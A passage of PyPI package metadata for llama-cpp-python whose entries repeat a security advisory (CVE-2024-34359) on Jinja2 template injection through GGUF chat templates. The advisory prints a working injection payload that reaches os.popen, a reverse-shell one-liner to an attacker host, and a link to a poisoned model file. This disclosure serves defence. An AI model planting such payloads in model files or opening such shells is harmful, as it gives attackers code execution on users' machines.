\"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.42":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.42/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.42","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"7171d5acd94964c599b348e81714aac9e75a578f51d224ac0343e27e6d9c38fc","md5":"897eaddb10305b091039c94d3067aa01","sha256":"31236d67424d2694c5c40fffea0930cbbdaa5862f35404664df43d87a3bd8c27"},"downloads":-1,"filename":"llama_cpp_python-0.2.42.tar.gz","has_sig":false,"md5_digest":"897eaddb10305b091039c94d3067aa01","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":10748284,"upload_time":"2024-02-13T17:38:38","upload_time_iso_8601":"2024-02-13T17:38:38.156714Z","url":"https://files.pythonhosted.org/packages/71/71/d5acd94964c599b348e81714aac9e75a578f51d224ac0343e27e6d9c38fc/llama_cpp_python-0.2.42.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.43":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.43/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.43","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"2c07b2bbd5e826d5910be3fd96eb639ba717349b3c2b0cc1360b13c63c50338a","md5":"96c8eef65533f84ab6a7c12b5abaaf7a","sha256":"fb3fd97622f7c1e373b28de1147fcdcc6a203705e6cc6376074225cf4f94711b"},"downloads":-1,"filename":"llama_cpp_python-0.2.43.tar.gz","has_sig":false,"md5_digest":"96c8eef65533f84ab6a7c12b5abaaf7a","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":36641865,"upload_time":"2024-02-14T09:33:51","upload_time_iso_8601":"2024-02-14T09:33:51.172946Z","url":"https://files.pythonhosted.org/packages/2c/07/b2bbd5e826d5910be3fd96eb639ba717349b3c2b0cc1360b13c63c50338a/llama_cpp_python-0.2.43.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.44":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.44/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.44","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"a31dfc000e07680831b074446f059611b02844fd9d949d70146b1ae7b2df9ccc","md5":"1f6bdf2b96e00d6fbe9461df41fa02f5","sha256":"afe0e93548d4ba75f20bc754039907594738a6381c9f4602922bcc8a418b2039"},"downloads":-1,"filename":"llama_cpp_python-0.2.44.tar.gz","has_sig":false,"md5_digest":"1f6bdf2b96e00d6fbe9461df41fa02f5","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":36622262,"upload_time":"2024-02-16T04:13:13","upload_time_iso_8601":"2024-02-16T04:13:13.193502Z","url":"https://files.pythonhosted.org/packages/a3/1d/fc000e07680831b074446f059611b02844fd9d949d70146b1ae7b2df9ccc/llama_cpp_python-0.2.44.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to 